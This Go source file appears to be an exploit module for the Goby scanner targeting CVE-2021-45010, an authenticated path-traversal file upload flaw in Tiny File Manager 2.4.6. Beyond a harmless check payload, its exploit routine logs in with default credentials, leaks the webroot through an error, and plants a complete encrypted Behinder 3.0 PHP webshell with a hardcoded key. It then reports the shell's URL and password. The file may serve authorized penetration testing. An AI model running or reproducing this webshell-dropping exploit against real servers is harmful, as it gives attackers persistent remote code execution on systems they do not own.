package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tiny File Manager Authenticated RCE (CVE-2021-45010)",
    "Description": "<p>Tiny File Manager is a web-based open source file manager.</p><p>A path traversal vulnerability exists in the tinyfilemanager.php file upload function in Tiny File Manager 2.4.6, which allows a remote attacker with a valid user account to upload a malicious PHP file to the webroot and execute code on the target server.</p>",
    "Impact": "Tiny File Manager Authenticated RCE (CVE-2021-45010)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/prasathmani/tinyfilemanager/commit/2046bbde72ed76af0cfdcae082de629bcc4b44c7\">https://github.com/prasathmani/tinyfilemanager/commit/2046bbde72ed76af0cfdcae082de629bcc4b44c7</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Tiny File Manager 文件管理器",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "Tiny File Manager 文件管理器后台任意文件上传漏洞 (CVE-2021-45010)",
            "Description": "<p>Tiny File Manager是一款基于Web的开源文件管理器。</p><p>Tiny File Manager 2.4.6中的tinyfilemanager.php文件上传功能存在路径遍历漏洞，该漏洞允许远程攻击者使用有效用户账户上传恶意PHP文件到webroot并在目标服务器上实现代码执行。</p>",
            "Impact": "<p>Tiny File Manager 2.4.6中的tinyfilemanager.php文件上传功能存在路径遍历漏洞，该漏洞允许远程攻击者使用有效用户账户上传恶意PHP文件到webroot并在目标服务器上实现代码执行。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序: <a href=\"https://github.com/prasathmani/tinyfilemanager/commit/2046bbde72ed76af0cfdcae082de629bcc4b44c7\">https://github.com/prasathmani/tinyfilemanager/commit/2046bbde72ed76af0cfdcae082de629bcc4b44c7</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Tiny File Manager 文件管理器",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Tiny File Manager Authenticated RCE (CVE-2021-45010)",
            "Description": "<p>Tiny File Manager is a web-based open source file manager.</p><p>A path traversal vulnerability exists in the tinyfilemanager.php file upload function in Tiny File Manager 2.4.6, which allows a remote attacker with a valid user account to upload a malicious PHP file to the webroot and execute code on the target server.</p>",
            "Impact": "Tiny File Manager Authenticated RCE (CVE-2021-45010)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/prasathmani/tinyfilemanager/commit/2046bbde72ed76af0cfdcae082de629bcc4b44c7\">https://github.com/prasathmani/tinyfilemanager/commit/2046bbde72ed76af0cfdcae082de629bcc4b44c7</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Tiny File Manager 文件管理器",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "banner=\"Set-Cookie: filemanager=\" || header=\"Set-Cookie: filemanager=\"",
    "GobyQuery": "banner=\"Set-Cookie: filemanager=\" || header=\"Set-Cookie: filemanager=\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/prasathmani/tinyfilemanager",
    "DisclosureDate": "2022-03-14",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202203-1434"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [
        "CVE-2021-45010"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202203-1434"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Behinder3.0",
            "show": ""
        },
        {
            "name": "user",
            "type": "input",
            "value": "admin",
            "show": ""
        },
        {
            "name": "pass",
            "type": "input",
            "value": "admin@123",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10262"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `fm_usr=admin&fm_pwd=admin%40123`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 302 && strings.Contains(resp1.HeaderString.String(), "?p=") {
				CookieFind := regexp.MustCompile("Set-Cookie: filemanager=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
				Webroot := "/var/www/html"
				uri4 := "/index.php?p=&upload"
				cfg4 := httpclient.NewPostRequestConfig(uri4)
				cfg4.VerifyTls = false
				cfg4.FollowRedirect = false
				cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg4.Header.Store("Cookie", "filemanager="+CookieFind[1])
				cfg4.Data = `type=upload&uploadurl=http://vyvyuytcuytcuycuytuy/&ajax=true`
				if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil {
					if resp4.StatusCode == 200 && strings.Contains(resp4.RawBody, "\"file\":") && strings.Contains(resp4.RawBody, "\\/index.php") {
						WebrootFind := regexp.MustCompile("\"file\":\"(.*?)/index.php\",\"line\"").FindStringSubmatch(resp4.RawBody)
						Webroot = strings.ReplaceAll(WebrootFind[1], "\\", "")
					}
				}
				RandName := goutils.RandomHexString(6)
				uri2 := "/?p="
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarysJRDXfs4muJMoNCb")
				cfg2.Header.Store("Cookie", "filemanager="+CookieFind[1])
				cfg2.Data = fmt.Sprintf("------WebKitFormBoundarysJRDXfs4muJMoNCb\r\nContent-Disposition: form-data; name=\"p\"\r\n\r\n\r\n------WebKitFormBoundarysJRDXfs4muJMoNCb\r\nContent-Disposition: form-data; name=\"fullpath\"\r\n\r\n../../../../../../../..%s/%s.php\r\n------WebKitFormBoundarysJRDXfs4muJMoNCb\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5(233);unlink(__FILE__);?>\r\n\r\n------WebKitFormBoundarysJRDXfs4muJMoNCb--\r\n", Webroot, RandName, RandName)
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && strings.Contains(resp2.RawBody, "success") {
					uri3 := "/" + RandName + ".php"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
						return resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "e165421110ba03099a1c0393373c5b43")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			user := ss.Params["user"].(string)
			pass := ss.Params["pass"].(string)
			if ss.Params["AttackType"].(string) == "Behinder3.0" {
				uri1 := "/"
				cfg1 := httpclient.NewPostRequestConfig(uri1)
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg1.Data = fmt.Sprintf(`fm_usr=%s&fm_pwd=%s`, url.QueryEscape(user), url.QueryEscape(pass))
				if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 302 && strings.Contains(resp1.HeaderString.String(), "?p=") {
					CookieFind := regexp.MustCompile("Set-Cookie: filemanager=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					Webroot := "/var/www/html"
					uri4 := "/index.php?p=&upload"
					cfg4 := httpclient.NewPostRequestConfig(uri4)
					cfg4.VerifyTls = false
					cfg4.FollowRedirect = false
					cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg4.Header.Store("Cookie", "filemanager="+CookieFind[1])
					cfg4.Data = `type=upload&uploadurl=http://vyvyuytcuytcuycuytuy/&ajax=true`
					if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil {
						if resp4.StatusCode == 200 && strings.Contains(resp4.RawBody, "\"file\":") && strings.Contains(resp4.RawBody, "\\/index.php") {
							WebrootFind := regexp.MustCompile("\"file\":\"(.*?)/index.php\",\"line\"").FindStringSubmatch(resp4.RawBody)
							Webroot = strings.ReplaceAll(WebrootFind[1], "\\", "")
						}
					}
					RandName := goutils.RandomHexString(6)
					uri2 := "/?p="
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarysJRDXfs4muJMoNCb")
					cfg2.Header.Store("Cookie", "filemanager="+CookieFind[1])
					cfg2.Data = fmt.Sprintf("------WebKitFormBoundarysJRDXfs4muJMoNCb\r\nContent-Disposition: form-data; name=\"p\"\r\n\r\n\r\n------WebKitFormBoundarysJRDXfs4muJMoNCb\r\nContent-Disposition: form-data; name=\"fullpath\"\r\n\r\n../../../../../../../..%s/%s.php\r\n------WebKitFormBoundarysJRDXfs4muJMoNCb\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\n@error_reporting(0);\nsession_start();\n    $key=\"e45e329feb5d925b\"; \n\t$_SESSION['k']=$key;\n\tsession_write_close();\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i<strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n?>\r\n\r\n------WebKitFormBoundarysJRDXfs4muJMoNCb--\r\n", Webroot, RandName, RandName)
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && strings.Contains(resp2.RawBody, "success") {
						uri3 := "/" + RandName + ".php"
						expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + uri3 + "\n"
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "Webshell tool: Behinder v3.0"
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
